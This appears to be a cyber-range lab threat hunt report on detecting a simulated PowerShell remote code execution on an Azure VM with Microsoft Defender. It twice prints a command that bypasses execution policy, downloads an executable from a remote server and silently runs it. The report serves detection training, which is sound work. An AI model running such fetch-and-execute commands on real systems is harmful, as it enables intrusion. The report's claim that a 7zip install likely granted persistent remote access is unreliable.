## **🔍 Threat Hunt Report**
## **🎯 Remote Code Execution (RCE) via PowerShell Payload and Creating a Detection Rule**

## **Platforms and Languages Leveraged**

*Microsoft Sentinel 🛰️*

*Windows 10 Virtual Machines (Microsoft Azure) ☁️*

*Microsoft Defender for Endpoint 🛡️*

*Kusto Query Language (KQL) 📊*

## **Scenario: Execution of remote code on the VM by the attacker 🖥️⚠️**

An attacker gains access to the VM through a vulnerability or a phishing attack. Once inside, they execute a Remote Code Execution (RCE) command using PowerShell to download and run a malicious payload, in this case, the 7zip installer.

Here's how the attacker might have carried out the attack:

**Initial Access:**
The attacker exploited a vulnerability in the system or tricked a user into downloading and running a malicious attachment (e.g., a weaponized PowerShell script disguised as an innocuous file). 🔐

**Execution:**
After gaining access, the attacker executes the following PowerShell command to download a malicious executable (7zip installer) from a remote server:

```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

**Payload Execution:**
The attacker uses Invoke-WebRequest to download the payload from a remote server. After the file is downloaded, the attacker silently installs the application by executing it with the /S (silent) flag, ensuring there are no user prompts during the installation. This download and installation are performed under the guise of a legitimate action, making detection more difficult. 🗂️🔍

**Detection:**
The Microsoft Defender for Endpoint (MDE) system detects the unusual PowerShell activity (particularly the use of Invoke-WebRequest and Start-Process in sequence), triggering an alert and activating the custom detection rule you set up. 🚦
____

## **How We Detected the RCE Payload 🔍⚡**

Our team developed a custom detection rule focused on spotting PowerShell commands that used Invoke-WebRequest and Start-Process — two key techniques attackers leverage to remotely download and execute payloads. The rule was designed to alert when these commands appeared within a certain time window. ⏳

When we ran the detection, we caught this PowerShell command running on the compromised system:
```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```
This command downloaded and silently installed a 7zip executable from an external source. The /S flag ensured the installer ran quietly without prompting the user. 👨‍💻🎭

Our analysis revealed the payload landed in C:\ProgramData\7z2408-x64.exe and was executed automatically, likely granting the attacker persistent remote access to the VM. 🚨🔐

